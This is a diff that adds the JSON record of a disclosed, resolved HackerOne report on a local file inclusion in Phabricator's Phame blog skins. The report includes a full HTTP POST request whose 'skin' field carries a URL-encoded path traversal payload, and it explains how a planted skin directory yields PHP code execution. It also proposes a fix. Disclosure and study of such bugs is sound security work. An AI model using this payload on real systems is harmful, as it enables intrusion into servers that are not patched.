@@ -1,0 +1,104 @@
+{
+  "id": 39428,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTQyOA==",
+  "url": "https://hackerone.com/reports/39428",
+  "title": "Phabricator Phame Blog Skins Local File Inclusion",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2014-12-15T15:52:43.735Z",
+  "submitted_at": "2014-12-15T15:52:43.735Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nullsub",
+    "url": "/nullsub",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/470/2fbec5598f656107a3ddd37f9e0f563a6494f29b_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 18,
+    "url": "https://hackerone.com/phabricator",
+    "handle": "phabricator",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Phabricator",
+      "twitter_handle": "phabricator",
+      "website": "http://phacility.com/phabricator/",
+      "about": "Phabricator is a collection of open source web applications that help software companies build better software."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2015-01-14T18:50:23.905Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2014-12-15T18:50:18.747Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Phabricator's Phame blog allows users to set a skin.\r\n\r\nAn attacker with the ability to upload files to the server can exploit this LFI vulnerability to gain remote code execution through Phabricator and thus, gain access to Phabricator's data. Common scenarios may include:\r\n\r\n- A box serving Phabricator and other web application that would allow uploading files to controlled paths.\r\n- A box where the attacker can log in through ssh as a restricted user (not having access to Phabricator's files, but having access to write in /tmp, for instance)\r\n- etc ...\r\n\r\nWhile testing, I used the following request to create a blog:\r\n\r\n```\r\nPOST /phame/blog/new/ HTTP/1.1\r\nHost: phabricator\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://phabricator.48bits.com/phame/blog/new/\r\nCookie: phsid=o36kfovszv6sqpbjheacicu2ykx25lqoh5iepeit; phusr=guest\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 254\r\n\r\n__csrf__=B%40acbxwmgk39152b45fd9eff2e&__form__=1&name=xxxx&description=bla&can_view=users&can_edit=users&can_join=users&custom_domain=&skin=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%74%6d%70%2f%74%65%73%74\r\n```\r\n\r\nThat makes phabricator try to load the skin template php files from:\r\n\r\n/var/www/phabricator/phabricator/externals/skins/../../../../../../../../../../tmp/test/\r\n\r\nIn order to exploit the vulnerability a valid skin structure must exist at the specified location, I have simply copied the oblivious skin and modified it to output a phpinfo() within the header.php script with the expected results.\r\n\r\nProposed fix:\r\n\r\nPhabricator should verify that the skin's path is not outside its own root.\r\n\r\n",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2015-01-14T18:50:18.868Z",
+  "allow_singular_disclosure_after": -286562637.9733207,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "shivammusic",
+    "b187ea9f29d0b4e0b293357"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
